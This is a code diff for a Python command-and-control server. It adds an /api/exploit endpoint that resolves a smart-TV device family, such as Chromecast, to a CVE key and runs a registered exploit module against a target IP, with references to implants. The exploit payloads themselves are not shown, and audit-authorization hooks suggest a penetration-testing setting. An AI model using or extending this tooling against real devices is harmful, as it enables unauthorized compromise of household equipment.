@@ -27,7 +27,8 @@ import c2_audit
 from c2_audit import (AuditEngagement, PatchEngagement, validate_client,
                       build_authorization_pdf, authorization_record_hash)
 from c2_ops import (utc_now_iso, scan_network, perform_scan, check_target,
-                    execute_patches, kill_all_connections, run_exploit)
+                    execute_patches, kill_all_connections, run_exploit,
+                    exploit_availability)
 
 # Device family -> CVE database key
 FAMILY_TO_TV_TYPE = {
@@ -51,6 +52,7 @@ FAMILY_TO_TV_TYPE = {
     "chromecast": "chromecast",
     "google tv": "chromecast",
     "google": "chromecast",
+    "chromecast-cast": "chromecast",
 }
 
 # Configuration
@@ -250,6 +252,13 @@ def get_device_id(ip):
     return hashlib.sha1(ip.encode()).hexdigest()[:12]
 
 
+def _valid_ipv4(ip):
+    """Strict dotted-quad check (rejects shorthand like '1.2.3')."""
+    parts = str(ip).split(".")
+    return len(parts) == 4 and all(
+        p.isdigit() and 0 <= int(p) <= 255 for p in parts)
+
+
 def record_scan_results(results):
     """Append scan findings to history (capped at 100) and persist to disk.
 
@@ -427,6 +436,8 @@ class C2Handler(BaseHTTPRequestHandler):
             self.serve_ai_keys_save()
         elif path == "/api/check":
             self.handle_check()
+        elif path == "/api/exploit":
+            self.handle_exploit()
         elif path == "/api/audit/authorize":
             self.handle_audit_authorize()
         elif path == "/api/audit/sign":
@@ -963,6 +974,66 @@ class C2Handler(BaseHTTPRequestHandler):
                 return
             result = check_target(ip, cve_scanner)
             self.send_json(200, {"status": "ok", "result": result})
+        except json.JSONDecodeError as e:
+            self.send_json(400, {"error": str(e)})
+        except Exception as e:
+            self.send_json(500, {"error": str(e)})
+
+    def handle_exploit(self):
+        """POST /api/exploit — execute the family exploit module against a
+        target and return the REAL outcome (Payload tab "Exploit" button).
+
+        Replaces the old flow that queued a `deploy` command no implant ever
+        consumed (implant IDs are sha1 hashes and the implant has no `deploy`
+        handler) and logged success unconditionally. The response carries the
+        module's actual attempted/success/error/duration fields.
+        """
+        try:
+            data = self._read_json_body()
+            ip = str(data.get("ip", "")).strip()
+            family = str(data.get("family", "")).strip()
+            tv_type = str(data.get("tv_type", "")).strip()
+
+            if not ip:
+                self.send_json(400, {"error": "Missing ip"})
+                return
+            if not _valid_ipv4(ip):
+                self.send_json(400, {"error": f"Invalid IPv4 address: {ip!r}"})
+                return
+
+            if not tv_type and family:
+                key = family.lower().split("(")[0].strip()
+                tv_type = FAMILY_TO_TV_TYPE.get(key, "")
+                if not tv_type:
+                    for cand, resolved in FAMILY_TO_TV_TYPE.items():
+                        if cand and cand in key:
+                            tv_type = resolved
+                            break
+            if not tv_type or tv_type not in TV_CVE_DATABASE:
+                self.send_json(404, {
+                    "error": f"no exploit module for family "
+                             f"{family or tv_type or 'unknown'!r}",
+                    "attempted": False,
+                    "known_families": sorted(set(FAMILY_TO_TV_TYPE.values())),
+                })
+                return
+
+            avail = exploit_availability(tv_type)
+            if not avail["ready"]:
+                self.send_json(404, {
+                    "error": f"no exploit module registered for "
+                             f"'{tv_type}' — generate one on the CVE Monitor "
+                             f"tab or pick another family",
+                    "tv_type": tv_type,
+                    "attempted": False,
+                })
+                return
+
+            result = run_exploit(tv_type, ip) or {}
+            result.update({"ip": ip, "tv_type": tv_type,
+                           "family": family or tv_type,
+                           "executed_at": utc_now_iso()})
+            self.send_json(200, {"status": "ok", **result})
         except json.JSONDecodeError as e:
             self.send_json(400, {"error": str(e)})
         except Exception as e:
